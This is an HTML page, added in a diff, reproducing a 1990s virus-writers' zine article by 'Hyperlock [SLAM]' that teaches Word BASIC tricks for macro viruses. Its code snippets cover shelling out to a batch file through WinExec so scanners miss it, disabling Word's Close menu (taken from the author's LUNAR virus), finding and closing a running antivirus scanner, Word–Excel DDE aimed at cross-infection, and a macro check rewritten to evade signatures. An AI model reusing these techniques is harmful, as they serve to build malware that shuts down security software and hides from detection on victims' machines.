@@ -1,0 +1,335 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Word 6/95 and 97 Tips n' Tricks</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Word 6/95 and 97 Tips
+n' Tricks<BR>
+Part 1<BR>
+</FONT><FONT SIZE=+2>by Hyperlock [SLAM]</FONT></FONT></B><BR>
+
+<HR WIDTH="100%"></P></CENTER>
+
+<UL>
+<PRE>
+<B>Introduction
+============
+
+</B>There are numerous ways to do things in Word BASIC/VBA, depending on
+which version you are using. But, there are better ways to do the
+routine tasks that a virus needs to do such as passing control to
+another external program, shell or whatever than using the standard
+methods provided by Word BASIC/VBA. There are also hidden and 
+undocumented features which may be of use to a virus writer.
+
+This article will explain some of the 'tricks of the trade' that you
+will find useful and will show you some undocumented features.
+
+
+
+<B>Contents
+========
+
+</B><A HREF="#1">1. Word - Alternative API Version of the Shell Command
+</A><A HREF="#2">2. Word - Disabling and Altering the System Control Menus
+</A><A HREF="#3">3. Word - Finding and Closing an Active Windows Task
+</A><A HREF="#4">4. Word and Excel - Rudimentary DDE Communication
+</A><A HREF="#5">5. Word - An Alternative Method of Checking For Macros
+
+
+</A>-------------------------------------------------------------------
+
+<A NAME="1"></A><B>1. Word - API Version of the Shell Command
+==========================================
+
+</B>So, one of the things that you will probably want to do in a virus
+is shell out to a DOS shell or another program, but using the standard
+Word 'Shell' command has its flaws:
+
+        1. Shell command does not return any condition codes
+        2. It sucks and can be scanned for as a virus scanner flag
+
+Envisage this scenario: you are sitting there, minding your own business
+and you just feel like dropping a load of debug script and shelling a
+batch file to process it for you. But ... the batch file decided to fail.
+How do you know? You don't, unless you use an alternative method - namely
+the method I am about to show you. USE IT.
+
+So, let's assume you have the following bit of code in your virus that
+runs a batch file &quot;run_scr.bat&quot;:
+
+        Shell p$ + &quot;\run_scr.bat&quot;, 0
+
+It fucks up, and you don't know because it hasn't returned anything. So,
+we do this instead:
+
+
+        In Word 7:
+
+        Declare Function WinExec Lib &quot;Kernel32&quot;(lpLine As String, \
+        nShow As Integer) As Integer
+
+        In Word 6:
+
+        Declare Function WinExec Lib &quot;Kernel&quot;(lpLine As String, \
+        nShow As Integer) As Integer
+
+
+Declare the APIs, then, you can do Shell using the following:
+
+        rc = WinExec(p$ + &quot;\run_scr.bat&quot;, 8)
+        If rc &lt; 32 Then
+          ' Error has occurred, so process it
+        End If
+
+The return codes that will affect the virus specifically are:
+
+        1       Out of memory
+        2,3     File or path not found
+        Other   Assume fatal error and process as required
+
+
+
+-------------------------------------------------------------------
+
+<A NAME="2"></A><B>2. Word - Disabling and Altering the System Control Menus
+=========================================================
+
+</B>--&gt; Note, this code is taken from the LUNAR VIRUS by Hyperlock.
+
+You can disable the system menus but only using the API. There is no
+function available in ANY version of Word to do this. So, without
+any more messing about, let's get to it. Hey, this will force people
+to use the File/Exit menu, so make sure you have that macro in your
+virus somewhere! ;&ordf;) So, the first call of the day is to disable or
+patch that System menu/Close command ...
+
+Not only that, you may, for whatever reason, want to alter the text
+on the system menus as well. Oh OK, I will show you how to do this
+as well. ;&ordf;) This is really cool.
+
+This bit of code uses the 32-bit kernel and hence will work in
+Word 7 (95) and possibly Word 97 as well, but I don't know about the
+latter as I haven't tried it.
+
+The API calls you will need for the 32-bit user.exe are thus:
+
+
+Declare Function GetMenuItemID Lib &quot;User32&quot;(hMenu As Integer, nPos As
+Integer) As Integer
+
+Declare Function GetSystemMenu Lib &quot;User32&quot;(hWnd As Integer, bRevert As
+Integer) As Integer
+
+Declare Function FindWindowA Lib &quot;User32&quot;(lpClassName$, lpWindowName
+As Long) As Integer
+
+Declare Function GetFocus Lib &quot;User32&quot;() As Integer
+
+Declare Function GetSystemMenu Lib &quot;User32&quot;(hWnd As Integer, bRevert As
+Integer) As Integer
+
+Declare Function ModifyMenuA Lib &quot;User32&quot;(hMenu As Integer, nPosition As
+Integer, wFlags As Integer, wIDNewItem As Integer, lpString$) As Integer
+
+
+I have stuck to the Windows naming standards for handles and parameters
+and all that shit. Therefore, you should be able to understand what
+they all mean.
+
+The system menu, both accessible from buttons on the title bar on the
+right hand by the menu itself from the left side of the title bar, has
+the following identifiers:
+
+        Option No.   | Menu Item
+        ----------------------------
+              0      | Restore
+              1      | Move 
+              2      | Size 
+              3      | Minimize 
+              4      | Maximize 
+              5      | Close 
+
+
+A menu item with a value of 0 is enabled and 1 is disabled. Given this,
+a function can be made to disable/enable menu items in the system menu.
+You can even alter the names. All that is required is to get a handle
+to the Word window, get the system menu ID, get a handle to the menu item
+on the Word system menu and then alter it using the API.
+
+Easy!
+
+
+
+Sub Main
+enabled = 0 : disabled = 1
+
+REM disable number 6 (close) and change its name to SLAM
+x = AlterMenu(&quot;SLAM&quot;, 6, disabled)
+MsgBox Str$(x)
+
+End Sub
+
+
+Function AlterMenu(item$, item, flag)
+
+  hWnd = FindWindowA(&quot;OPUSAPP&quot;, 0)
+  hmenu = getsystemmenu(hwnd, 0)
+  hItem = getmenuitemid(hMenu, item)
+  AlterMenu =  ModifyMenuA(hmenu, hitem, flag, - 10, item$)
+
+End Function
+
+
+
+-------------------------------------------------------------------
+
+<A NAME="3"></A><B>3. Word - Finding and Closing an Active Windows Task
+====================================================
+
+
+</B>Picture the scenario - you are just about to perform one of your
+droppers or your virus is about to copy itself into a template when,
+would you believe it, there is a fuckin' virus scanner sitting in
+memory. What a bastard, and this thing is just waiting for you. So,
+you do this: &lt;ha ha ha&gt;
+
+
+Sub MAIN
+
+If AppIsRunning(&quot;Findvirus&quot;) Then
+  AppClose(&quot;Findvirus&quot;)
+Else
+  MsgBox &quot;not running&quot;
+End If
+
+End Sub
+
+
+Let us say that there is a virus scanner called FindVirus running, you
+will obviously want to close it. So, all you do is pass the string as
+it will appear in the Task List to AppIsRunning, and if a positive value
+is returned, you AppClose it. Cool eh.
+
+
+
+-------------------------------------------------------------------
+
+<A NAME="4"></A><B>4. Word and Excel - Rudimentary DDE Communication
+=================================================
+
+</B>This is an introduction to DDE (Dynamic Data Exchange) with Word and
+Excel, rather than applying it to anything virus related in this
+part. Part 2 in SLAM 4 will show you how to run Excel macros from Word
+and vice-versa. Pretty neat for running an Excel virus from a Word
+virus or for running a Word virus from an Excel one. To give you a
+quick example of DDE I have written the demon bit of code below.
+
+
+Client (Word)  --------&gt;  Server (Excel)
+
+
+I know it is a pile of shit and does nothing more than open Excel,
+write some text and concatenate it in Excel, pull the answer back
+into Word an then display it, but hey, I said it was an example,
+and not a friggin' work of art. I think I need some lessons from
+Virtual Daemon [SLAM] on how to be more abusive! &lt;ha ha ha&gt;
+
+If you find the following macro doesn't work, then load up Excel first
+using the ALTERNATIVE SHELL method as described above of course. If you
+want to find out if Excel is running, use GetModuleHandle to find out,
+or use the AppIsRunning example in section 3.
+
+
+REM
+REM Start up a DDE channel with Excel, perform some
+REM simple manipulation and terminate the channel.
+REM
+
+Sub MAIN
+
+channel = DDEInitiate(&quot;Excel&quot;, &quot;sheet1&quot;)
+DDEPoke channel, &quot;R1C1&quot;, &quot;3&quot;
+DDEPoke channel, &quot;R2C1&quot;, &quot;SLAM&quot;
+a$ = &quot;=CONCATENATE(A2, &quot; + Chr$(34) + &quot; &quot; + Chr$(34) + &quot;, A1)&quot;
+DDEPoke channel, &quot;R1C2&quot;, a$
+a$ = DDERequest$(channel, &quot;R1C2&quot;)
+DDETerminate channel
+MsgBox &quot;E-Zine = &quot; + a$
+
+End Sub
+
+
+I want you back here for part 2 where I will show you how to run macros
+in Word from Excel and vica-versa ... SO BE HERE.
+
+
+
+-------------------------------------------------------------------
+
+<A NAME="5"></A><B>5. Word - An Alternative Method of Checking For Macros
+======================================================
+
+</B>We are forever trying to make our virii such that a scanner looking
+for certain signatures will not pick them up. This can be a real pisser
+if you have spent a few days perfecting your latest creation and then
+a few weeks later some AV bloke decided to he can scan for it with
+just a slight addition to the drivers. That really pisses me off, so
+I have another method of performing that most rudimentary of operations,
+the checking of existing macros.
+
+Consider the following macro which was taken from the Nuclear virus but
+is fairly common. It checks of the existance of the Autoexec macro. Now,
+to me, that is a lot of code to perform that operation.
+
+OLD METHOD (FROM NUCLEAR VIRUS)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Function CheckInstalled
+    CheckInstalled = 0
+    If CountMacros(0) &gt; 0 Then
+        For i = 1 To CountMacros(0)
+            If MacroName$(i, 0) = &quot;AutoExec&quot; Then
+                CheckInstalled = 1
+            End If
+        Next i
+    End If
+End Function
+
+
+There is a DIFFERENT and NEWER way of doing this. I will show you below. 
+
+
+NEW METHOD (ADAPTED FROM LUNAR VIRUS by Hyperlock)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Sub Main
+On Error Goto exit
+
+  Mac$ = &quot;AutoExec&quot;
+  rc = IsExecuteOnly(&quot;Global:&quot; + Mac$)
+   ToolsMacro .Name = Mac$, .Run
+
+exit:
+  If err = 511 Then
+    ' macro does not exist
+
+End Sub
+
+
+
+-------------------------------------------------------------------
+
+Hyperlock [<A HREF="groups2.htm#SLAM">SLAM</A>]        e-mail: <A HREF="mailto:hyperlock@usa.net">hyperlock@usa.net</A></PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+
+</PRE>
+
+</BODY>
+</HTML>
